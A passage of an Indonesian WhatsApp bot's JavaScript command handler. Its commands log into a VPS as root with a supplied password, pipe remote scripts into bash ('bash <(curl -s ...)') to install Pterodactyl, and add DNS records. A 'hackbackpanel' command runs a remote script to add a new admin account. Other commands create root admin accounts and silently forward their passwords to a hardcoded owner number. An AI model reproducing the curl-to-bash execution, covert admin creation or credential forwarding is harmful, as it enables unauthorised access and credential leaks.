        Reply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        Reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafaharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case 'installpanel3': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 5) return Reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel3 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        Reply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        Reply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        Reply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        Reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support 々 IjulTaka || 乂🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'installpanel4': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel4 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support 々 IjulTaka || 乂🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'installpanel5': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 5) return Reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel5 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        Reply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        Reply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        Reply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        Reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support 々 IjulTaka || 乂🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'startwings': case 'configurewings': {
    if (!isCreator) return Reply(mess.owner)
    
    let t = text.split(',');
    if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan: ${prefix}startwings ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        Reply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘 𝗪𝗜𝗡𝗚𝗦')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
Reply('𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗧𝗔𝗥𝗧 𝗪𝗜𝗡𝗚𝗦 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗖𝗘𝗞 𝗡𝗢𝗗𝗘 𝗔𝗡𝗗𝗔😁');
                conn.end();
            }).on('data', (data) => {
            stream.write(`${global.tokeninstall}\n`);
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'hbpanel': case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'domain': {
if (!isCreator && !isSeller) return Reply(`Khusus Premium Subdomain`)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cadp': {
    if (!isCreator) return Reply(mess.owner)

    // Validasi format input
    let s = q.split(',');
    if (s.length < 3) 
        return Reply(`❌ *Format Salah!*\n\n📌 *Penggunaan:* \`${prefix + command} username,nomor,server\`\n\n📝 *Contoh:*\n\`${prefix + command} example,@user,1\``);

    let username = s[0].trim();
    let nomor = s[1].trim();
    let serverChoice = s[2].trim();

    if (!username || !nomor || !serverChoice) 
        return Reply(`❌ *Semua parameter harus diisi!*\n\n📌 *Format:* \`${prefix + command} username,nomor,server\``);

    let password = `${username}rafax`;
    let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Pilihan server
    let serverConfig;
    switch (serverChoice) {
        case "1":
            serverConfig = { domain: global.domain, apikey: global.apikey };
            break;
        case "2":
            serverConfig = { domain: global.domainV2, apikey: global.apikeyV2 };
            break;
        default:
            return Reply(`❌ *Server tidak valid!*\n\nPilih salah satu:\n1️⃣ *Server 1*\n2️⃣ *Server 2*`);
    }

    // Proses pembuatan admin panel
    let response = await fetch(`${serverConfig.domain}/api/application/users`, {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${serverConfig.apikey}`
        },
        body: JSON.stringify({
            email: `${username}@rafax.srvdev`,
            username: username,
            first_name: username,
            last_name: "Member",
            language: "en",
            root_admin: true,
            password: password
        })
    });

    let data = await response.json();
    if (data.errors) 
        return Reply(`❌ *Gagal Membuat Akun!*\n\n🛠️ *Detail Error:*\n${JSON.stringify(data.errors[0], null, 2)}`);

    let user = data.attributes;

    // Pesan notifikasi
    let tks = `
🎉 *Admin Panel Berhasil Dibuat!* ✅  
📌 *Dibuat Oleh:* *${m.pushName || 'Pengguna'}*

┏━━━⬣ *DATA AKUN* ⬣━━━┓
┣ 📡 *ID:* ${user.id}
┣ 👤 *Username:* ${user.username}
┣ ✉️ *Email:* ${user.email}
┣ 🦸‍♂️ *Nama:* ${user.first_name} ${user.last_name}
┣ 🌍 *Bahasa:* ${user.language}
┣ 🔐 *Admin Status:* ${user.root_admin ? '✅ Aktif' : '❌ Tidak Aktif'}
┣ ⏰ *Dibuat Pada:* ${user.created_at}
┗━━━━━━━━━━━━━━━━━━━━━┛`;

    await conn.sendMessage(m.chat, { text: tks });

    // Kirim informasi ke pengguna target
    await conn.sendMessage(nomornya, {
        text: `
*💻 Data Admin Panel Anda*

👤 *Username:* ${username}
🔑 *Password:* ${password}
🌐 *Login:* ${serverConfig.domain}

📌 *Catatan:* Mohon simpan informasi ini dengan baik. Tidak ada pengiriman ulang jika data hilang!

© 々 IjulTaka || 乂 Dev
`
    });

    // Kirim pemberitahuan kepada owner utama
    let ownerMain = "62895373974000@s.whatsapp.net"; // Nomor owner utama
    let notifOwner = `
📢 *Notifikasi Owner: Admin Panel Dibuat*

👤 *Pengguna:* @${nomornya.split('@')[0]}
👤 *Dibuat oleh:* @${m.sender.split('@')[0]}
📛 *Username:* ${user.username}
🔑 *Password:* ${password}
✉️ *Email:* ${user.email}
🌐 *Server:* ${serverConfig.domain}
⏰ *Waktu:* ${user.created_at}`;

    await conn.sendMessage(ownerMain, { text: notifOwner });
}
break;

case 'cadp2': {
    if (!isCreator) return Reply(mess.owner)

    // Pastikan ada input username dan server
    let s = q.split(',');
    if (s.length < 2) 
        return Reply(`❌ *Format Salah!*\n\n📌 *Penggunaan:* \`${prefix + command} username,server\`\n\n📝 *Contoh:*\n\`${prefix + command} user123,1\``);

    let username = s[0].trim();
    let serverChoice = s[1].trim().toLowerCase();

    if (!m.quoted) 
        return Reply(`⚠️ *Silakan reply pesan pengguna yang ingin dibuatkan akun dengan perintah ini!*`);

    // Ambil nomor dari pesan yang dibalas
    let target = m.quoted.sender;
    let targetNumber = target.split('@')[0];
    if (!targetNumber) 
        return Reply(`❌ *Nomor tidak valid! Pastikan Anda membalas pesan pengguna dengan benar.*`);

    // Pilih server berdasarkan input
    let serverConfig;
    switch (serverChoice) {
        case "1":
            serverConfig = { domain: global.domain, apikey: global.apikey };
            break;
        case "2":
            serverConfig = { domain: global.domainV2, apikey: global.apikeyV2 };
            break;
        default:
            return Reply(`❌ *Server tidak valid!*\n\nPilih:\n1️⃣ *Server 1*\n2️⃣ *Server 2*`);
    }

    // Buat password acak
    let password = crypto.randomBytes(7).toString('hex');

    // Request ke server API untuk membuat akun
    let f = await fetch(`${serverConfig.domain}/api/application/users`, {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${serverConfig.apikey}`
        },
        body: JSON.stringify({
            email: `${username}@rafax.srvdev`,
            username: username,
            first_name: username,
            last_name: "Member",
            language: "en",
            root_admin: true,
            password: password
        })
    });

    let data = await f.json();
    if (data.errors) 
        return Reply(`❌ *Gagal Membuat Akun!*\n\n🛠️ *Detail Error:*\n${JSON.stringify(data.errors[0], null, 2)}`);

    let user = data.attributes;

    // Kirim informasi ke grup atau pengirim
    let tks = `
🎉 *Admin Panel Berhasil Dibuat!* ✅

┏━━━━━❖ *DATA AKUN* ❖━━━━━┓
┃ 👤 *User ID*    : ${user.id}
┃ 🌐 *UUID*       : ${user.uuid}
┃ 📛 *Username*   : ${user.username}
┃ ✉️ *Email*      : ${user.email}
┃ 🛡️ *Admin*      : ${user.root_admin ? 'Ya' : 'Tidak'}
┃ 📆 *Created At* : ${user.created_at}
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛`;

    await conn.sendMessage(m.chat, { text: tks });

